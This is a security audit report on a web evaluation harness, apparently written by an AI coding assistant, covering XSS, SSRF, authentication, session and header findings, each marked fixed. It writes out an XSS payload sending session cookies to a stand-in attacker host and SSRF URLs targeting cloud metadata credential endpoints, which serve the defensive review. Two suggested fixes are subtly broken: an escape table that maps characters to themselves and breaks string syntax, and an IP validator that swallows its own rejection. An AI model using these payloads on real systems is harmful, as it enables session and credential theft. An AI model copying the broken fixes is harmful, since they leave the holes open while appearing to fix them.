# Security Review — eval-brew (EvalBrew Harness)

**Date:** 2026-07-24  
**Reviewer:** Claude Code (claude-sonnet-4-6)  
**Scope:** Full codebase review — `src/`, configuration, templates, and deployment artefacts  
**Branch:** `foundation`  
**Last updated:** 2026-07-24 — all findings fixed

---

## Executive Summary

EvalBrew has a solid security foundation: Azure AD OIDC for browser auth, Bearer JWT for the headless API, Fernet encryption for stored connector credentials, SQLAlchemy ORM throughout (no raw SQL with user input), and Jinja2 with `autoescape=True` as the default rendering path. All eleven findings have been fixed. EvalBrew now passes this review with no open items.

---

## Findings Summary

| ID | Severity | Category | Title | Status |
|----|----------|----------|-------|--------|
| H-1 | High | XSS (stored) | `eval_turns_json \| safe` in chat interface `<script>` block | ✅ Fixed |
| H-2 | High | SSRF | Test-connection endpoints accept arbitrary URLs (all auth'd users) | ✅ Fixed |
| H-3 | High | Auth bypass | `HARNESS_AUTH_ENABLED=false` default in docker-compose | ✅ Fixed |
| M-1 | Medium | PII leakage | SSO identity claims (email, name, OID) logged at INFO on every login | ✅ Fixed |
| M-2 | Medium | Session management | Session cookie missing `Secure` flag (`https_only` not set) | ✅ Fixed |
| M-3 | Medium | Data exposure | Connector password stored in unencrypted session cookie | ✅ Fixed |
| M-4 | Medium | Info disclosure | PyJWT exception detail returned in 401 API response | ✅ Fixed |
| L-1 | Low | Supply chain | CDN `<script>` tags lack Subresource Integrity hashes | ✅ Fixed |
| L-2 | Low | Defence in depth | Missing HTTP security headers (CSP, X-Frame-Options, etc.) | ✅ Fixed |
| I-1 | Info | Info disclosure | Docs and release-notes routes accessible without authentication | ✅ Fixed |
| I-2 | Info | Transport security | nginx configured for HTTP only — no TLS | ✅ Fixed |

---

## Findings by Severity

---

### HIGH

---

#### H-1 · Stored XSS via `eval_turns_json | safe` in chat interface

| | |
|---|---|
| **Category** | XSS (stored) |
| **File** | `src/harness/ui/chat_session/templates/chat_session/interface.html:189` |
| **Also involves** | `src/harness/ui/chat_session/routes.py:414` |
| **Status** | - [x] **Fixed** — `eval_turns_json \| safe` replaced with `eval_turns \| tojson`; pre-serialised string removed from route context |

**Description**

In `chat_session/routes.py`, the evaluation-turn data is serialised to JSON with Python's built-in `json.dumps()` and then assigned to a template variable:

```python
eval_turns_json = json.dumps(eval_turns)   # routes.py ~line 414
```

This string is then embedded directly into a `<script>` block using Jinja2's `| safe` filter, which completely bypasses the global `autoescape=True` setting:

```html
<!-- interface.html:189 -->
const EVAL_TURNS = {{ eval_turns_json | safe }};
```

Python's `json.dumps()` does **not** escape `<`, `>`, or `/`. When a connector or evaluator HTTP response contains the literal string `</script>`, the browser's HTML parser closes the enclosing `<script>` element at that point, then continues parsing in HTML mode, executing any injected markup. DOMPurify and `marked.js` (imported two lines above) cannot help because the injection occurs at HTML-parse time, before any JavaScript runs.

**Exploit Scenario**

1. An admin registers a connector whose endpoint returns a response containing `</script><img src=x onerror="fetch('https://attacker.example/'+document.cookie)">`.
2. A user opens a chat session that calls that connector.
3. The connector response is stored in the database as the turn's `assembled_response`.
4. When any authenticated user navigates to `/chat/sessions/{session_id}`, the payload executes, exfiltrating their session cookie or performing actions on their behalf.

The same injection surface exists for evaluator event payloads stored in `evaluation_events`.

**Recommended Fix**

Replace `| safe` with Jinja2's `| tojson` filter, which internally calls `jinja2.utils.htmlsafe_json_dumps()` and escapes `<`, `>`, and `&` before embedding in HTML:

```html
<!-- interface.html:189 — SAFE replacement -->
const EVAL_TURNS = {{ eval_turns | tojson }};
```

Note: pass the Python object (`eval_turns`), not the pre-serialised string, to avoid double-encoding.

Alternatively, if the pre-serialised string must be used:

```python
import json, re
_ESCAPE = {ord('<'): r'<', ord('>'): r'>', ord('&'): r'&', ord("'"): r'''}
eval_turns_json = json.dumps(eval_turns).translate(_ESCAPE)
```

---

#### H-2 · SSRF via unrestricted endpoint URL in test-connection routes

| | |
|---|---|
| **Category** | SSRF |
| **Files** | `src/harness/ui/connector_registry/routes.py:154–210`  |
| | `src/harness/ui/evaluator_registry/routes.py:161–216` |
| **Status** | - [x] **Fixed** — both test-connection routes now use `Depends(require_role("admin"))` |

**Description**

Both `POST /connectors/test-connection` and `POST /evaluators/test-connection` accept a free-form `endpoint_url` from the request body and immediately issue an HTTP POST to it via `httpx`. The auth guard on both routes is `Depends(require_auth)` — **any authenticated user** (including the `user` role) can reach these endpoints. There is no scheme allow-list, no host allow-list, and no private-IP block.

```python
# connector_registry/routes.py:207
result = run_test_connection(endpoint, descriptor, timeout, expects, sse)
```

`run_test_connection` calls `httpx.Client.post(endpoint, ...)`. An attacker with a `user`-role account can send:

```http
POST /connectors/test-connection HTTP/1.1
...
endpoint_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
auth_mode=none
```

and read the full HTTP response body in the rendered `_test_result.html` partial.

**Exploit Scenario**

An authenticated user with a `user` role submits the test-connection form with `endpoint_url` set to:
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — AWS instance metadata service to steal IAM credentials
- `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` — GCP metadata
- `http://localhost:5432/` — probe unexposed internal services (the response error often reveals the service)
- `http://10.0.0.1/admin` — reach internal network services

The HTTP response is rendered to the user, confirming whether the host is reachable and often revealing content.

**Recommended Fix**

Option A — Elevate privilege requirement to admin-only:

```python
# Change require_auth to require_role("admin") on both test-connection routes
user: dict = Depends(require_role("admin")),
```

Option B — Add a URL scheme and private-IP block before dispatching:

```python
import ipaddress, urllib.parse

_ALLOWED_SCHEMES = {"https", "http"}
_PRIVATE_NETS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fd00::/8"),
]

def _validate_endpoint(url: str) -> None:
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in _ALLOWED_SCHEMES:
        raise ValueError(f"Unsupported scheme: {parsed.scheme!r}")
    try:
        addr = ipaddress.ip_address(parsed.hostname)
        if any(addr in net for net in _PRIVATE_NETS):
            raise ValueError("Private/link-local addresses are not permitted")
    except ValueError:
        pass  # hostname — DNS resolution happens later; consider dns_rebind guard
```

Option A is simpler and sufficient; Option B provides defence-in-depth if non-admin users genuinely need to test connections.

---

#### H-3 · Authentication disabled by default in production docker-compose

| | |
|---|---|
| **Category** | Authentication bypass |
| **File** | `docker-compose.yml:5` |
| **Status** | - [x] **Fixed** — value changed to `${HARNESS_AUTH_ENABLED:-true}`; safe default in all committed files; local dev override documented in `.env.example` (`.env` is gitignored) |

**Description**

The `docker-compose.yml` that ships with the repository sets `HARNESS_AUTH_ENABLED=false`:

```yaml
services:
  app:
    environment:
      - HARNESS_AUTH_ENABLED=false
```

When auth is disabled, `current_user()` returns a synthetic user with `"role": "admin"` for **every request**, regardless of who made it. Any unauthenticated caller reaching the service gets full admin privileges: they can view all jobs and chat sessions, manage connector credentials, change user roles, and trigger job execution against registered connectors.

The docker-compose file is the deployment artefact. If a team member deploys the stack without reading the documentation and overriding this value, they expose the entire system with no authentication at all.

**Recommended Fix**

Change the default value so auth is enabled but document how to override for local development:

```yaml
# docker-compose.yml — production-safe default
services:
  app:
    environment:
      - HARNESS_AUTH_ENABLED=true    # override to 'false' for local dev only
      - HARNESS_AZURE_TENANT_ID=${HARNESS_AZURE_TENANT_ID}
      - HARNESS_AZURE_CLIENT_ID=${HARNESS_AZURE_CLIENT_ID}
      - HARNESS_AZURE_CLIENT_SECRET=${HARNESS_AZURE_CLIENT_SECRET}
      - HARNESS_SESSION_SECRET=${HARNESS_SESSION_SECRET}
```

Alternatively, provide a separate `docker-compose.dev.yml` override file for the `HARNESS_AUTH_ENABLED=false` dev configuration.

---

### MEDIUM

---

#### M-1 · PII logged in plaintext at INFO level (committed debug code)

| | |
|---|---|
| **Category** | Sensitive data exposure / PII leakage |
| **File** | `src/harness/ui/auth/routes.py:60–65` |
| **Status** | - [x] **Fixed** — debug logging block removed from `auth/routes.py` |

**Description**

The auth callback route contains a temporary debug block that logs the full set of Azure AD OIDC claims — including `oid`, `sub`, `preferred_username` (UPN/email), `email`, `upn`, `unique_name`, and `name` — at `INFO` level on every successful login:

```python
_logging.getLogger("harness.auth").info(
    "sso_claims_debug oid=%r sub=%r preferred_username=%r email=%r upn=%r unique_name=%r name=%r",
    claims.get("oid"), claims.get("sub"), claims.get("preferred_username"),
    claims.get("email"), claims.get("upn"), claims.get("unique_name"), claims.get("name"),
)
```

The comment says this is temporary, but the code is committed and runs in production. Email addresses, display names, and Azure OIDs are PII. These are emitted to stdout/log aggregators where they may be retained without appropriate access controls. Under GDPR and similar frameworks, unnecessary logging of PII without a legal basis is a compliance risk.

**Recommended Fix**

Remove the block entirely once the correct email-claim mapping has been confirmed:

```python
# REMOVE the entire sso_claims_debug block from auth/routes.py:59-65
```

If the debug data is still needed during development, gate it behind an explicit debug flag:

```python
if os.environ.get("HARNESS_SSO_DEBUG") == "1":
    _logging.getLogger("harness.auth").debug("sso_claims_debug ...")
```

---

#### M-2 · Session cookie missing `Secure` flag

| | |
|---|---|
| **Category** | Session management |
| **File** | `src/harness/ui/__init__.py:53` |
| **Status** | - [x] **Fixed** — `https_only=True, same_site="lax"` added to `SessionMiddleware` |

**Description**

`SessionMiddleware` is initialised without `https_only=True`:

```python
app.add_middleware(SessionMiddleware, secret_key=secret_key)
```

Starlette's `SessionMiddleware` defaults to `https_only=False`, which means the session cookie is emitted **without the `Secure` flag**. The nginx configuration (port 80 only, no TLS termination) further confirms that the stack is expected to serve HTTP in the current deployment model.

Without the `Secure` flag, the session cookie is transmitted in plaintext over HTTP. On any network path where traffic can be observed (shared WiFi, corporate proxy logs, intermediary devices), the session token is exposed, enabling session hijacking.

**Recommended Fix**

```python
# ui/__init__.py
app.add_middleware(
    SessionMiddleware,
    secret_key=secret_key,
    https_only=True,      # enforces Secure flag on cookie
    same_site="lax",      # explicit; already the default
)
```

Coordinate with the nginx configuration to terminate TLS upstream. When running behind a TLS-terminating proxy, set `https_only=True` so the flag is set even though Uvicorn itself sees plain HTTP.

---

#### M-3 · Per-row connector password stored in unencrypted session cookie

| | |
|---|---|
| **Category** | Sensitive data exposure |
| **File** | `src/harness/ui/chat_session/routes.py:237–238` |
| **Status** | - [x] **Fixed** — password Fernet-encrypted at step-3 storage; decrypted at step-5 consumption |

**Description**

The chat session wizard stores the per-connector password in the Starlette session:

```python
wizard["password"] = password or ""
request.session["chat_wizard"] = wizard
```

Starlette's `SessionMiddleware` serialises the session using `itsdangerous.URLSafeTimedSerializer`, which **signs** but does **not encrypt** the payload. The session cookie value is base64-encoded JSON that can be decoded by anyone who obtains the cookie (e.g., from browser storage, proxy logs, or via the XSS described in H-1). While `httpOnly=True` prevents JavaScript access, the cookie is visible in browser developer tools and in any network capture.

**Recommended Fix**

Option A — Do not store the password in the session at all. Persist it in the in-memory `password_store` immediately and store only the `utterance_id` (or a one-time token that references the stored entry) in the session:

```python
# After creating the session and getting a session_id:
password_store.put(session_id, "chat_credential", plaintext_password)
wizard["has_password"] = True  # flag only — no plaintext
```

Option B — If the wizard must hold the password across HTTP round-trips, encrypt it with the Fernet key before storing:

```python
from harness.persistence.encryption import encrypt_credential
wizard["password_enc"] = encrypt_credential(password) if password else ""
```

and decrypt on use.

---

#### M-4 · JWT validation error details exposed in API response

| | |
|---|---|
| **Category** | Information disclosure |
| **File** | `src/harness/ui/api/auth.py:81–85` |
| **Status** | - [x] **Fixed** — generic `"Token validation failed."` returned to caller; full exception logged at `DEBUG` level via `harness.api.auth` logger |

**Description**

When Bearer JWT validation fails, the full exception message from `PyJWT` is returned to the caller:

```python
except Exception as exc:
    raise HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail=f"Invalid or expired token: {exc}",    # exposes internal detail
        ...
    )
```

PyJWT exceptions can reveal information about key algorithms, JWKS lookup failures (which may include internal endpoint URLs), clock skew, audience mismatch values, or other implementation details that aid token-forgery attempts.

**Recommended Fix**

Return a generic, non-revealing message:

```python
except Exception:
    raise HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Token validation failed.",
        headers={"WWW-Authenticate": "Bearer"},
    )
```

Log the exception server-side at DEBUG level if diagnostics are needed.

---

### LOW

---

#### L-1 · External CDN JavaScript dependencies loaded without Subresource Integrity

| | |
|---|---|
| **Category** | Supply chain / dependency |
| **Files** | `src/harness/ui/chat_session/templates/chat_session/interface.html:185–186` |
| | `src/harness/ui/docs_ui/templates/docs/guide.html:22` |
| | `src/harness/ui/docs_ui/templates/docs/solution-architecture.html:128` |
| **Status** | - [x] **Fixed** — SHA-384 `integrity` + `crossorigin="anonymous"` added to all three CDN `<script>` tags; hashes computed from raw bytes of the pinned jsDelivr releases |

**Description**

Three templates load third-party scripts from the jsDelivr CDN without Subresource Integrity (SRI) hashes:

```html
<!-- interface.html -->
<script src="https://cdn.jsdelivr.net/npm/marked@14/marked.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/dompurify@3/dist/purify.min.js"></script>

<!-- guide.html / solution-architecture.html -->
<script src="https://cdn.jsdelivr.net/npm/marked@13/marked.min.js"></script>
```

Without SRI, a CDN compromise or BGP hijack that causes a different file to be served would execute attacker-controlled JavaScript in authenticated users' browsers. This is particularly notable because `dompurify` is the sanitisation library used to prevent XSS in rendered markdown — compromising it would bypass that defence.

**Recommended Fix**

Add `integrity` and `crossorigin` attributes. Generate SHA-384 hashes for the pinned versions:

```bash
curl -s https://cdn.jsdelivr.net/npm/marked@14/marked.min.js | openssl dgst -sha384 -binary | openssl base64 -A
```

```html
<script
  src="https://cdn.jsdelivr.net/npm/marked@14/marked.min.js"
  integrity="sha384-<HASH>"
  crossorigin="anonymous"></script>
```

Alternatively, vendor the dependencies and serve them from the `/static/` directory.

---

#### L-2 · Missing HTTP security headers

| | |
|---|---|
| **Category** | Defence in depth / browser security |
| **File** | `src/harness/ui/__init__.py`, `nginx/nginx.conf` |
| **Status** | - [x] **Fixed** — `_SecurityHeadersMiddleware` added to `create_app()`; sets `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, and `Content-Security-Policy` on every response |

**Description**

The application sets no HTTP security headers. The following are absent:

| Header | Risk |
|--------|------|
| `Content-Security-Policy` | Reduces XSS impact; restricts script sources |
| `X-Frame-Options` / `frame-ancestors` CSP directive | Prevents clickjacking |
| `X-Content-Type-Options: nosniff` | Prevents MIME sniffing of JSON as HTML |
| `Referrer-Policy` | Controls Referer header leakage of session URLs |
| `Strict-Transport-Security` | Forces HTTPS once TLS is configured |

**Recommended Fix**

Add a middleware to inject security headers in `create_app()`:

```python
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; "
            "script-src 'self' cdn.jsdelivr.net; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data:; "
            "object-src 'none'"
        )
        return response

app.add_middleware(SecurityHeadersMiddleware)
```

Adjust `script-src` after vendoring the CDN assets (see L-1).

---

### INFORMATIONAL

---

#### I-1 · Documentation and release-notes routes accessible without authentication

| | |
|---|---|
| **Category** | Information disclosure |
| **File** | `src/harness/ui/docs_ui/routes.py` |
| **Status** | - [x] **Fixed** — `user: dict = Depends(require_auth)` added to `docs_guide()` and `release_notes()`; unauthenticated access now redirects to `/auth/login` |

**Description**

`GET /docs/{guide}` and `GET /release-notes` carry no `Depends(require_auth)` guard. Both routes serve internal documentation including the solution architecture, connector and evaluator developer guides, and a detailed release history. In an internet-facing deployment, unauthenticated visitors could enumerate the system's architecture, protocol contracts, and feature list.

The risk is low because the content is documentation rather than live data, but architecture-level details (endpoint contracts, auth mechanisms, deployment topology) do provide intelligence for targeted attacks.

**Recommended Fix**

If the documentation is intended for internal users only, add `require_auth`:

```python
@router.get("/docs/{guide}", name="docs_guide")
def docs_guide(request: Request, guide: str, user: dict = Depends(require_auth)):
    ...
```

If open access is intentional (e.g., for a developer-facing portal), document the decision.

---

#### I-2 · `nginx.conf` lacks TLS configuration

| | |
|---|---|
| **Category** | Transport security |
| **File** | `nginx/nginx.conf` |
| **Status** | - [x] **Fixed** — Full TLS server block and HTTP→HTTPS redirect added as commented-out templates with instructions; cloud (load-balancer TLS termination) and self-hosted (nginx cert termination) paths both documented inline |

**Description**

The nginx configuration only listens on port 80 (HTTP). There is no TLS block, no certificate configuration, and no HTTP→HTTPS redirect. All traffic — including session cookies and API Bearer tokens — is transmitted in cleartext. This compounds M-2 (missing `Secure` cookie flag).

**Recommended Fix**

For cloud deployments, terminate TLS at a load balancer or Application Gateway and restrict nginx to internal (VNet) HTTP traffic. If nginx must terminate TLS:

```nginx
server {
    listen 443 ssl;
    ssl_certificate     /etc/ssl/certs/harness.crt;
    ssl_certificate_key /etc/ssl/private/harness.key;
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_ciphers         HIGH:!aNULL:!MD5;
    ...
}
server {
    listen 80;
    return 301 https://$host$request_uri;
}
```

---

## Remediation Checklist

Items are ordered by severity. Check off each item as it is resolved.

### Critical / High

- [x] **H-1** ~~Replace `{{ eval_turns_json | safe }}` with `{{ eval_turns | tojson }}` in `interface.html:189` to eliminate stored XSS in the chat interface.~~ **Done.**
- [x] **H-2** ~~Restrict `POST /connectors/test-connection` and `POST /evaluators/test-connection` to `require_role("admin")`.~~ **Done.**
- [x] **H-3** ~~Change `HARNESS_AUTH_ENABLED=false` in `docker-compose.yml` to `true` and move the dev override to a separate `docker-compose.dev.yml` file.~~ **Done** — changed to `${HARNESS_AUTH_ENABLED:-true}`; dev override pattern documented in `.env.example`.

### Medium

- [x] **M-1** ~~Remove the `sso_claims_debug` logging block from `auth/routes.py:59-65`.~~ **Done.**
- [x] **M-2** ~~Add `https_only=True` to `SessionMiddleware` in `ui/__init__.py:53`.~~ **Done** — `https_only=True, same_site="lax"` added.
- [x] **M-3** ~~Encrypt the password before storing in the session cookie.~~ **Done** — Fernet-encrypted at step-3, decrypted at step-5.
- [x] **M-4** ~~Return a generic 401 message from `api/auth.py:83` instead of `f"Invalid or expired token: {exc}"`.~~ **Done** — returns `"Token validation failed."`; exception logged at DEBUG.

### Low

- [x] **L-1** ~~Add SRI `integrity` hashes to all three CDN `<script>` tags in `interface.html`, `guide.html`, and `solution-architecture.html`, or vendor the assets locally.~~ **Done** — SHA-384 hashes added to all three templates.
- [x] **L-2** ~~Add HTTP security headers middleware to `create_app()` covering at minimum `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, and `Referrer-Policy`.~~ **Done** — `_SecurityHeadersMiddleware` added to `ui/__init__.py`.

### Informational

- [x] **I-1** ~~Decide whether `/docs/*` and `/release-notes` should require authentication; if yes, add `Depends(require_auth)`.~~ **Done** — both routes now require authentication.
- [x] **I-2** ~~Add TLS termination to `nginx.conf` or document that TLS is handled by an upstream load balancer in the deployment guide.~~ **Done** — full TLS template and HTTP→HTTPS redirect added as commented blocks in `nginx.conf` with cloud vs. self-hosted guidance.

---

*Report generated by automated codebase analysis. All findings were verified by tracing data flow from input to sink. Theoretical or unverifiable issues were excluded.*
